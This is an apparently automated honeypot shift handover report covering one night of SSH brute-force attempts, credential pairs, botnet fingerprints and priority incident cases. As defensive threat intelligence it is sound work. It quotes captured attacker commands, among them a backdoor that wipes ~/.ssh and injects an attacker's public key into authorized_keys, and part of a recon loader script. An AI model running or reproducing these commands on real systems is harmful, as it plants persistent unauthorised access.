# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-15 |
| **Generated At** | 2026-08-15T06:43:50Z |
| **Shift Time** | 06:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **3533** |
| Confirmed Threats | **3508** |
| False Positives Filtered | **25** (0.7%) |
| Unique Attacker IPs | **79** |
| Countries of Origin | **28** |
| High Severity Cases | **75** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **3458** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **92** |
| Unique Credential Pairs | **57** |
| Unique Usernames | **13** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **83** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 41 |
| `support` | 13 |
| `centos` | 10 |
| `user` | 9 |
| `test` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `passw0rd` | 11 |
| `P@ssword` | 5 |
| `support` | 5 |
| `5555555` | 5 |
| `P@ssw0rd` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `centos` | `passw0rd` | 6 |
| `support` | `support` | 5 |
| `root` | `5555555` | 5 |
| `user` | `passw0rd` | 4 |
| `support` | `P@ssw0rd` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `global` | `global123` | `14.103.114.244` | 2026-08-15T02:58:18 |
| `345gs5662d34` | `345gs5662d34` | `14.103.114.244` | 2026-08-15T02:58:26 |
| `user` | `P@ssword` | `10.0.0.73` | 2026-08-15T03:08:38 |
| `root` | `0987654321` | `45.142.193.164` | 2026-08-15T03:09:28 |
| `support` | `support` | `176.53.159.196` | 2026-08-15T03:09:41 |
| `user` | `P@ssword` | `220.163.252.244` | 2026-08-15T03:10:14 |
| `user` | `123123` | `120.194.50.39` | 2026-08-15T03:10:29 |
| `user` | `123123` | `80.233.12.109` | 2026-08-15T03:10:36 |
| `root` | `1qazXSW@` | `217.165.22.192` | 2026-08-15T03:13:38 |
| `root` | `Abcd@123456` | `14.103.114.244` | 2026-08-15T03:17:15 |
| `test` | `p@ssw0rd` | `50.223.176.171` | 2026-08-15T03:17:21 |
| `test` | `p@ssw0rd` | `187.49.63.51` | 2026-08-15T03:17:32 |
| `test` | `p@ssw0rd` | `101.13.4.124` | 2026-08-15T03:17:42 |
| `roo` | `roo` | `14.103.114.244` | 2026-08-15T03:20:55 |
| `support` | `admin1` | `196.188.93.169` | 2026-08-15T03:22:27 |
| `support` | `admin1` | `182.151.45.136` | 2026-08-15T03:22:36 |
| `user` | `passw0rd` | `10.0.0.73` | 2026-08-15T03:26:59 |
| `root` | `987654321` | `45.142.193.164` | 2026-08-15T03:32:16 |
| `root` | `5555555` | `10.0.0.73` | 2026-08-15T03:32:46 |
| `deploy` | `deploy1234` | `217.165.22.192` | 2026-08-15T03:32:52 |
| `support` | `support` | `10.0.0.73` | 2026-08-15T03:34:29 |
| `centos` | `passw0rd` | `10.0.0.73` | 2026-08-15T03:42:22 |
| `no-reply` | `123456` | `14.103.114.244` | 2026-08-15T03:42:59 |
| `user` | `passw0rd` | `187.8.120.90` | 2026-08-15T03:43:44 |
| `user` | `passw0rd` | `103.158.138.179` | 2026-08-15T03:43:54 |
| `centos` | `passw0rd` | `185.15.189.232` | 2026-08-15T03:44:02 |
| `centos` | `passw0rd` | `213.101.138.172` | 2026-08-15T03:44:16 |
| `root` | `5555555` | `218.15.224.102` | 2026-08-15T03:50:56 |
| `root` | `5555555` | `183.63.220.210` | 2026-08-15T03:51:07 |
| `root` | `5555555` | `203.192.247.84` | 2026-08-15T03:51:09 |
| `root` | `5555555` | `24.142.170.231` | 2026-08-15T03:51:16 |
| `root` | `Aa123456` | `217.165.22.192` | 2026-08-15T03:52:06 |
| `root` | `87654321` | `45.142.193.164` | 2026-08-15T03:54:32 |
| `centos` | `passw0rd` | `187.49.63.51` | 2026-08-15T03:59:58 |
| `centos` | `passw0rd` | `116.48.143.166` | 2026-08-15T04:00:08 |
| `support` | `P@ssw0rd` | `10.0.0.73` | 2026-08-15T04:00:24 |
| `root` | `1` | `92.118.39.14` | 2026-08-15T04:05:05 |
| `blank` | `password321` | `10.0.0.73` | 2026-08-15T04:06:16 |
| `admin` | `admin` | `47.94.230.80` | 2026-08-15T04:06:57 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-15T04:06:58 |
| `root` | `12` | `92.118.39.14` | 2026-08-15T04:07:25 |
| `root` | `123` | `92.118.39.14` | 2026-08-15T04:09:49 |
| `root` | `1qaz@WSX` | `217.165.22.192` | 2026-08-15T04:11:20 |
| `root` | `1234` | `92.118.39.14` | 2026-08-15T04:12:08 |
| `root` | `12345` | `92.118.39.14` | 2026-08-15T04:14:25 |
| `test` | `1234567890` | `10.0.0.73` | 2026-08-15T04:16:14 |
| `root` | `7654321` | `45.142.193.164` | 2026-08-15T04:16:39 |
| `support` | `P@ssw0rd` | `59.93.36.136` | 2026-08-15T04:17:21 |
| `support` | `P@ssw0rd` | `36.93.154.207` | 2026-08-15T04:17:32 |
| `root` | `1234567` | `92.118.39.14` | 2026-08-15T04:18:50 |
| `root` | `12345678` | `92.118.39.14` | 2026-08-15T04:20:57 |
| `centos` | `marketing` | `107.135.117.245` | 2026-08-15T04:22:22 |
| `centos` | `marketing` | `219.129.236.174` | 2026-08-15T04:22:33 |
| `root` | `123456789` | `92.118.39.14` | 2026-08-15T04:22:55 |
| `blank` | `password321` | `122.187.230.183` | 2026-08-15T04:24:44 |
| `root` | `1234567890` | `92.118.39.14` | 2026-08-15T04:24:50 |
| `root` | `123qwe` | `92.118.39.14` | 2026-08-15T04:26:49 |
| `root` | `123qwerty` | `92.118.39.14` | 2026-08-15T04:28:51 |
| `root` | `buzhidao` | `217.165.22.192` | 2026-08-15T04:30:34 |
| `root` | `21` | `92.118.39.14` | 2026-08-15T04:30:50 |
| `root` | `321` | `92.118.39.14` | 2026-08-15T04:32:52 |
| `test` | `1234567890` | `61.185.30.170` | 2026-08-15T04:34:08 |
| `root` | `4321` | `92.118.39.14` | 2026-08-15T04:34:50 |
| `root` | `54321` | `92.118.39.14` | 2026-08-15T04:36:43 |
| `magento` | `12345678` | `23.29.118.224` | 2026-08-15T04:37:51 |
| `345gs5662d34` | `345gs5662d34` | `23.29.118.224` | 2026-08-15T04:37:52 |
| `magento` | `3245gs5662d34` | `23.29.118.224` | 2026-08-15T04:37:53 |
| `root` | `654321` | `92.118.39.14` | 2026-08-15T04:38:39 |
| `root` | `654321` | `45.142.193.164` | 2026-08-15T04:39:05 |
| `support` | `alpine` | `10.0.0.73` | 2026-08-15T04:39:50 |
| `root` | `P4ssw0rd` | `92.118.39.14` | 2026-08-15T04:40:36 |
| `blank` | `P@ssword` | `103.120.116.162` | 2026-08-15T04:41:06 |
| `blank` | `P@ssword` | `223.210.27.53` | 2026-08-15T04:41:17 |
| `root` | `P4ssword` | `92.118.39.14` | 2026-08-15T04:42:37 |
| `root` | `P@ssw0rd` | `92.118.39.14` | 2026-08-15T04:44:42 |
| `root` | `Passw0rd` | `92.118.39.14` | 2026-08-15T04:46:41 |
| `root` | `p4ssword` | `92.118.39.14` | 2026-08-15T04:48:38 |
| `root` | `Admin@1234` | `217.165.22.192` | 2026-08-15T04:49:50 |
| `root` | `p@ssw0rd` | `92.118.39.14` | 2026-08-15T04:50:41 |
| `centos` | `marketing` | `111.70.23.238` | 2026-08-15T04:51:15 |
| `centos` | `marketing` | `101.13.5.49` | 2026-08-15T04:51:25 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-08-15T04:52:50 |
| `root` | `password` | `92.118.39.14` | 2026-08-15T04:55:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **3533** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 40 |
| OpenSSH | 29 |
| libssh | 26 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 28 | 27 |
| `2ec37a7cc8da...` | Mirai/variant | 25 | 1 |
| `f555226df196...` | Mirai/variant | 16 | 2 |
| `e45f2d6d7f79...` | Mirai/variant | 6 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 5 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 28 | 27 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 25 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 16 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 2 | — |
| `e45f2d6d7f79...` | Go SSH scanner | 6 | 1 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 5 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 23 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `23.29.118.224`, `14.103.114.244`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **79** |
| Unique ASNs | **63** |
| High-Risk ASNs | **50** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS396982` | Google LLC | 4 | LOW |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 2 | HIGH |
| `AS3301` | Telia Company AB | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (75)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c50f491b722a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 02:58 |
| **Last Seen** | 2026-08-15 02:58 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:58:16` | `cowrie.session.connect` |
| `2026-08-15 02:58:16` | `cowrie.client.version` |
| `2026-08-15 02:58:16` | `cowrie.client.kex` |
| `2026-08-15 02:58:18` | `cowrie.login.success` |
| `2026-08-15 02:58:19` | `cowrie.session.params` |
| `2026-08-15 02:58:19` | `cowrie.command.input` |
| `2026-08-15 02:58:19` | `cowrie.command.failed` |
| `2026-08-15 02:58:20` | `cowrie.log.closed` |
| `2026-08-15 02:58:21` | `cowrie.session.params` |
| `2026-08-15 02:58:21` | `cowrie.command.input` |
| `2026-08-15 02:58:22` | `cowrie.session.file_download` |
| `2026-08-15 02:58:22` | `cowrie.log.closed` |
| `2026-08-15 02:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e59e815f9e4e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 02:58 |
| **Last Seen** | 2026-08-15 02:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 02:58:22` | `cowrie.session.connect` |
| `2026-08-15 02:58:23` | `cowrie.client.version` |
| `2026-08-15 02:58:23` | `cowrie.client.kex` |
| `2026-08-15 02:58:26` | `cowrie.login.success` |
| `2026-08-15 02:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c71b7606e8ce

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 03:08 |
| **Last Seen** | 2026-08-15 03:09 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:08:59` | `cowrie.session.connect` |
| `2026-08-15 03:09:05` | `cowrie.client.version` |
| `2026-08-15 03:09:05` | `cowrie.client.kex` |
| `2026-08-15 03:09:28` | `cowrie.login.success` |
| `2026-08-15 03:09:39` | `cowrie.session.params` |
| `2026-08-15 03:09:39` | `cowrie.command.input` |
| `2026-08-15 03:09:46` | `cowrie.log.closed` |
| `2026-08-15 03:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fe613767a89

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-15 03:09 |
| **Last Seen** | 2026-08-15 03:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:09:40` | `cowrie.session.connect` |
| `2026-08-15 03:09:40` | `cowrie.client.version` |
| `2026-08-15 03:09:40` | `cowrie.client.kex` |
| `2026-08-15 03:09:41` | `cowrie.login.success` |
| `2026-08-15 03:09:41` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:09:41` | `cowrie.direct-tcpip.data` |
| `2026-08-15 03:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3d060e46a5d

| Field | Detail |
|---|---|
| **Source IP** | `220.163.252[.]244` |
| **First Seen** | 2026-08-15 03:10 |
| **Last Seen** | 2026-08-15 03:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:10:11` | `cowrie.session.connect` |
| `2026-08-15 03:10:12` | `cowrie.client.version` |
| `2026-08-15 03:10:12` | `cowrie.client.kex` |
| `2026-08-15 03:10:14` | `cowrie.login.success` |
| `2026-08-15 03:10:15` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.163.252[.]244` to AbuseIPDB if not already reported
- [ ] Block `220.163.252[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-450c6d0758f2

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-08-15 03:10 |
| **Last Seen** | 2026-08-15 03:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:10:26` | `cowrie.session.connect` |
| `2026-08-15 03:10:27` | `cowrie.client.version` |
| `2026-08-15 03:10:27` | `cowrie.client.kex` |
| `2026-08-15 03:10:29` | `cowrie.login.success` |
| `2026-08-15 03:10:29` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b481f4c0bf

| Field | Detail |
|---|---|
| **Source IP** | `80.233.12[.]109` |
| **First Seen** | 2026-08-15 03:10 |
| **Last Seen** | 2026-08-15 03:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:10:35` | `cowrie.session.connect` |
| `2026-08-15 03:10:35` | `cowrie.client.version` |
| `2026-08-15 03:10:35` | `cowrie.client.kex` |
| `2026-08-15 03:10:36` | `cowrie.login.success` |
| `2026-08-15 03:10:37` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.12[.]109` to AbuseIPDB if not already reported
- [ ] Block `80.233.12[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a951a9c819a

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 03:13 |
| **Last Seen** | 2026-08-15 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:13:38` | `cowrie.session.connect` |
| `2026-08-15 03:13:38` | `cowrie.client.version` |
| `2026-08-15 03:13:38` | `cowrie.client.kex` |
| `2026-08-15 03:13:38` | `cowrie.login.success` |
| `2026-08-15 03:13:39` | `cowrie.session.params` |
| `2026-08-15 03:13:39` | `cowrie.command.input` |
| `2026-08-15 03:13:40` | `cowrie.log.closed` |
| `2026-08-15 03:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b80174794ad2

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 03:17 |
| **Last Seen** | 2026-08-15 03:22 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:17:12` | `cowrie.session.connect` |
| `2026-08-15 03:17:12` | `cowrie.client.version` |
| `2026-08-15 03:17:14` | `cowrie.client.kex` |
| `2026-08-15 03:17:15` | `cowrie.login.success` |
| `2026-08-15 03:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-607618842b22

| Field | Detail |
|---|---|
| **Source IP** | `50.223.176[.]171` |
| **First Seen** | 2026-08-15 03:17 |
| **Last Seen** | 2026-08-15 03:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:17:16` | `cowrie.session.connect` |
| `2026-08-15 03:17:18` | `cowrie.client.version` |
| `2026-08-15 03:17:18` | `cowrie.client.kex` |
| `2026-08-15 03:17:21` | `cowrie.login.success` |
| `2026-08-15 03:17:22` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.223.176[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.223.176[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0ef076dcd97

| Field | Detail |
|---|---|
| **Source IP** | `187.49.63[.]51` |
| **First Seen** | 2026-08-15 03:17 |
| **Last Seen** | 2026-08-15 03:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:17:30` | `cowrie.session.connect` |
| `2026-08-15 03:17:30` | `cowrie.client.version` |
| `2026-08-15 03:17:30` | `cowrie.client.kex` |
| `2026-08-15 03:17:32` | `cowrie.login.success` |
| `2026-08-15 03:17:33` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.49.63[.]51` to AbuseIPDB if not already reported
- [ ] Block `187.49.63[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ff0e7319365

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]124` |
| **First Seen** | 2026-08-15 03:17 |
| **Last Seen** | 2026-08-15 03:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:17:39` | `cowrie.session.connect` |
| `2026-08-15 03:17:40` | `cowrie.client.version` |
| `2026-08-15 03:17:40` | `cowrie.client.kex` |
| `2026-08-15 03:17:42` | `cowrie.login.success` |
| `2026-08-15 03:17:43` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]124` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc9a0bb185b0

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 03:20 |
| **Last Seen** | 2026-08-15 03:25 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:20:54` | `cowrie.session.connect` |
| `2026-08-15 03:20:54` | `cowrie.client.version` |
| `2026-08-15 03:20:54` | `cowrie.client.kex` |
| `2026-08-15 03:20:55` | `cowrie.login.success` |
| `2026-08-15 03:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-316672858c3e

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-15 03:22 |
| **Last Seen** | 2026-08-15 03:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 03:22:25` | `cowrie.session.connect` |
| `2026-08-15 03:22:26` | `cowrie.client.version` |
| `2026-08-15 03:22:26` | `cowrie.client.kex` |
| `2026-08-15 03:22:27` | `cowrie.login.success` |
| `2026-08-15 03:22:27` | `cowrie.direct-tcpip.request` |
| `2026-08-15 03:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
